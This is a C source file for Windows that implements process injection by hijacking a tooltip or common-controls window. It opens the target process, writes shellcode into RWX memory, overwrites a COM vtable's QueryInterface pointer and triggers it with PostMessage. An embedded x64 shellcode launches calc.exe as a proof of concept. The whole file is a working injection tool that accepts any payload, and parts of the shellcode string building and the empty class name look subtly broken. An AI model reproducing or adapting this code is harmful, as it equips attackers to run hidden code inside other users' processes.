
#include <Windows.h>
#include "ntlib_modexp/util.h"

/*
// classes that work
PWCHAR class[] =
{
  L"tooltips_class32",
  L"ForegroundStaging",
  L"Shell_TrayWnd",
  NULL
};
*/

LPVOID  pic;
DWORD   len;

typedef struct _IUnknown_VFT {
	// IUnknown
	LPVOID QueryInterface;
	LPVOID AddRef;
	LPVOID Release;

	// everything from here could be anything
	// we're only interested in the IUnknown interface
	ULONG_PTR padding[128];
} IUnknown_VFT;

VOID comctrl_inject(PWCHAR cls, LPVOID payload, DWORD payloadSize)
{
	HWND         hw = 0;
	SIZE_T       rd, wr;
	LPVOID       ds, cs, p, ptr;
	HANDLE       hp;
	DWORD        pid;
	IUnknown_VFT unk;

	// 1. find a tool tip window.
	//    read index zero of window bytes
	for (;;) 
	{
		hw = FindWindowExW(NULL, hw, cls, NULL);
		if (hw == NULL) return;
		
		printf("Found window %p.\n", (LPVOID)hw);
		
		p = (LPVOID)GetWindowLongPtr(hw, 0);
		if (p != NULL) break;
	}
	
	GetWindowThreadProcessId(hw, &pid);
	printf("Found window bytes %p in %i.\n", p, pid);

	// 2. open the process and read CToolTipsMgr
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hp == NULL) return;
	
	ReadProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &rd);
	ReadProcessMemory(hp, ptr, &unk, sizeof(unk), &rd);

	// 3. allocate RWX memory and write payload there.
	//    update callback
	cs = VirtualAllocEx(hp, NULL, payloadSize,
		MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

	// 4. allocate RW memory and write updated CToolTipsMgr
	unk.QueryInterface = cs;
	ds = VirtualAllocEx(hp, NULL, sizeof(unk),
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hp, ds, &unk, sizeof(unk), &wr);

	printf("Updating..");

	// 5. update pointer, trigger execution
	WriteProcessMemory(hp, p, &ds, sizeof(ULONG_PTR), &wr);
	PostMessage(hw, WM_USER, 0, 0);
	Sleep(1000);

	// 6. restore original pointer and cleanup
	WriteProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &wr);
	VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
	CloseHandle(hp);
}

// GetWindowModuleFileName doesn't always work.
PWCHAR wnd2proc(HWND hw)
{
	PWCHAR         name = NULL;
	DWORD          pid;
	HANDLE         ss;
	BOOL           bResult;
	PROCESSENTRY32 pe;

	GetWindowThreadProcessId(hw, &pid);

	ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (ss != INVALID_HANDLE_VALUE) {
		pe.dwSize = sizeof(PROCESSENTRY32);

		bResult = Process32First(ss, &pe);
		while (bResult) {
			if (pe.th32ProcessID == pid) {
				name = pe.szExeFile;
				break;
			}
			bResult = Process32Next(ss, &pe);
		}
		CloseHandle(ss);
	}
	return name;
}

PWCHAR addr2sym(HANDLE hp, LPVOID addr) {
	WCHAR        path[MAX_PATH];
	BYTE         buf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(WCHAR)];
	PSYMBOL_INFO si = (PSYMBOL_INFO)buf;
	static WCHAR name[MAX_PATH];

	ZeroMemory(path, ARRAYSIZE(path));
	ZeroMemory(name, ARRAYSIZE(name));

	GetMappedFileName(
		hp, addr, path, MAX_PATH);

	PathStripPath(path);

	si->SizeOfStruct = sizeof(SYMBOL_INFO);
	si->MaxNameLen = MAX_SYM_NAME;

	if (SymFromAddr(hp, (DWORD64)addr, NULL, si)) {
		wsprintfW(name, L"%s!%hs", path, si->Name);
	}
	else {
		lstrcpyW(name, path);
	}
	return name;
}

// WorkerA or WorkerW created by SHCreateWorkerWindowW
BOOL IsClassPtr(HWND hwnd, LPVOID ptr) {
	MEMORY_BASIC_INFORMATION mbi;
	DWORD                    res, pid;
	HANDLE                   hp;
	LPVOID                   ds;
	SIZE_T                   rd;
	BOOL                     bClass = FALSE;

	if (ptr == NULL) return FALSE;

	GetWindowThreadProcessId(hwnd, &pid);
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hp == NULL) return FALSE;

	SymSetOptions(SYMOPT_DEFERRED_LOADS);
	SymInitialize(hp, NULL, TRUE);

	// read first value of pointer
	ReadProcessMemory(hp, ptr, &ds, sizeof(ULONG_PTR), &rd);

	// query the pointer
	res = VirtualQueryEx(hp, ds, &mbi, sizeof(mbi));
	if (res != sizeof(mbi)) return FALSE;

	bClass = ((mbi.State == MEM_COMMIT) &&
		(mbi.Type == MEM_IMAGE) &&
		(mbi.Protect == PAGE_READONLY));

	if (bClass) {
		printf("%ws - ", addr2sym(hp, ptr));
		printf("%ws - ", addr2sym(hp, ds));
	}
	SymCleanup(hp);
	CloseHandle(hp);

	return bClass;
}

/*
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	WCHAR    cls[MAX_PATH];
	PWCHAR   filter = (PWCHAR)lParam;
	LPVOID   cs;
	DWORD    pid;

	GetClassNameW(hwnd, cls, MAX_PATH);

	// filter specified?
	if (filter != NULL) {
		// does class match our filter? skip printing if not
		if (StrStrI(cls, filter) == NULL) goto L1;
	}
	cs = (LPVOID)GetWindowLongPtr(hwnd, 0);
	GetWindowThreadProcessId(hwnd, &pid);

	if (IsClassPtr(hwnd, cs)) {
		printf("%p %p %-40ws %ws : %i\n",
			hwnd, cs, cls, wnd2proc(hwnd), pid);
	}

L1:
	EnumChildWindows(hwnd, EnumWindowsProc, lParam);

	return TRUE;
}

VOID comctrl_list(PWCHAR filter) {
	EnumWindows(EnumWindowsProc, (LPARAM)filter);
}
*/

int TooltipExecute()
{
	unsigned char shellcode[] = {
		// 构建"calc.exe"字符串到栈上
		0x48, 0x31, 0xC0,               // xor rax, rax
		0x50,                           // push rax        ; null terminator
		0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
		0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

		// 设置参数并调用
		0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
		0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
		0x5A,                           // pop rdx         ; 第二个参数

		// 调用WinExec
		0x48, 0xB8,                     // mov rax,
		0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
		0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
		0x48, 0xF7, 0xD0,               // not rax
		0xFF, 0xD0                      // call rax
	};
	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
	// 填充WinExec地址
	*(UINT64*)(shellcode + 22) = ~WinExecAddr;


	PWCHAR classname = (PWCHAR)L"";
	comctrl_inject(classname, shellcode, sizeof(shellcode));


	return 0;
}
